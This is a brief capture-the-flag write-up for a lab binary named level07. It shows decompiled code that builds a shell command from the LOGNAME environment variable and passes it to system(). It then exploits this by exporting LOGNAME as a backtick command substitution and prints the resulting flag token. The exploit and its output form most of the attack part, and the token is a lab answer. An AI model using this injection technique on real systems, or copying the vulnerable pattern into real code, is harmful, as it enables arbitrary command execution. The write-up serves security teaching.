# First step

We have a executable file level07.

```shell
$> ./level07
level07
```

With Ghidra
```c
[...]
pcVar1 = getenv("LOGNAME");  
asprintf(&local_1c,"/bin/echo %s ",pcVar1);  
iVar2 = system(local_1c);
[...]

// we get the value of the environment variable LOGNAME  
// save a commande line (echo) to local_1c  
// execute the commande line and save the return value in iVar2
```

# Second step

Very easy to guess this action.  
We only need to change the value of the 'LOGNAME' with export command  
```shell
$> export LOGNAME='`getflag`'

$> ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```